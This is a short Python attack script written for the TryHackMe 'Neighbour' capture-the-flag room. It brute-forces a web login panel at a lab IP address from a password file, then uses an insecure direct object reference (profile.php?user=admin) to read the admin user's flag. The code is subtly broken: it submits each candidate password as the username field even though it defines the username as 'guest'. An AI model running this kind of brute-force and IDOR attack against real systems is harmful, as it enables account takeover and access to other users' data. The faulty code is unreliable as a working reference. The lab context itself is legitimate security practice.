#!/usr/bin/python3

# Author: h3g0c1v
# Github: https://github.com/h3g0c1v
# This is a script written in Python3, which performs a brute force attack against a login panel.
# After getting the credentials, it obtains the machine's Flag.
# Script oriented to TryHackMe's Neighbour machine which can be found at the following link --> https://tryhackme.com/room/neighbour

from pwn import *
import requests, time, sys, pdb, signal

def def_handler(sig, frame):
    print("\n[+] Saliendo ...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
login_url = "http://10.10.221.47/index.php"
idor_url = "http://10.10.221.47/profile.php?user=admin"
username = "guest"

def makeBruteForce():

    f = open("passwords.txt", "r")
    
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")
    
    time.sleep(2)

    counter = 1

    for password in f.readlines():
        password = password.strip()
        
        p1.status("Probando con la password [%d/414]: %s" % (counter, password))

        s = requests.Session()

        r = s.get(login_url)
        
        data_post = {
                'username': password,
                'password': password
        }
        
        r = s.post(login_url, data=data_post)
        
        if "Invalid" not in r.text:
            p1.success("%s:%s" % (username, password))
            break
        
        counter += 1

    p2 = log.progress("Obtener la flag")
    p2.status("Obteniendo la flag del usuario admin")

    time.sleep(2)

    r = s.get(idor_url)
    
    flag = re.findall(r'flag{.*?}', r.text)[0]

    p2.success("%s" % flag)

if __name__ == '__main__':

    makeBruteForce()
